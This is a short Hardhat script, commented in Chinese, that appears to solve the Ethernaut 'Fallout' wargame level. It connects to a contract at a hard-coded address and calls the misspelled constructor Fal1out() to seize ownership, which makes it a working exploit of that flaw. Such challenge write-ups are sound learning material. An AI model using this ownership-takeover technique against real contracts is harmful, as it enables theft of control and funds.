import hre from "hardhat";

// 替換成 Fallout 實例合約地址
const contractAddress = "0x7451Ec6AeFaF19D9766c4d45d66275CD87755297"; 
console.log("目標 Fallout 實例合約地址:", contractAddress);

const fallout = await hre.ethers.getContractAt("Fallout", contractAddress);

async function main() {  
  // 查詢合約 owner
  const owner = await fallout.owner();
  console.log("Contract owner:", owner);
 
  // 變成合約 owner
  await fallout.Fal1out();
  console.log("Contract owner:", await fallout.owner());

}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
